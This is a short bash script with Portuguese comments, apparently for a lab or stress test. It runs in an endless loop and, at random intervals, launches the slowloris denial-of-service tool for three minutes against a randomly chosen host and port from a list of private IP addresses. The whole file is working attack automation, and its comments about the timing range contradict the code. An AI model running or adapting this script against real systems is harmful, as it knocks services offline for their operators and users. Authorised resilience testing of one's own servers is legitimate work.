#!/bin/bash

# --- Configuração ---
declare -a TARGET_IPS=("192.168.1.10" "192.168.1.11" "192.168.1.12")
declare -a TARGET_PORTS=("8000" "8001" "8002")

# Loop infinito para que o script continue rodando
while true; do
  ### 1. Calcular o tempo de espera aleatório ###
  # (dentro do intervalo [10min,1h])

  # 5 minutos = 300 segundos
  # 1 hora = 3600 segundos

  RANGE=630
  MIN_TIME=30
  RANDOM_TIME=$((($RANDOM % $RANGE) + $MIN_TIME))

  echo "[INFO] Próximo teste em $RANDOM_TIME segundos (Aprox. $(($RANDOM_TIME / 60)) minutos)."
  sleep $RANDOM_TIME

  ### 2. Escolher um par de IP/Porta aleatório
  NUM_TARGETS=${#TARGET_IPS[@]}
  RANDOM_INDEX=$(($RANDOM % $NUM_TARGETS))
  TARGET_IP=${TARGET_IPS[$RANDOM_INDEX]}
  TARGET_PORT=${TARGET_PORTS[$RANDOM_INDEX]}

  ### 3. Executar o slowloris por 180s (3 minutos) no alvo
  timeout 180s slowloris -p "$TARGET_PORT" "$TARGET_IP"

  echo "[INFO] Teste em $TARGET_IP:$TARGET_PORT concluído."
  echo "-----------------------------------"
done
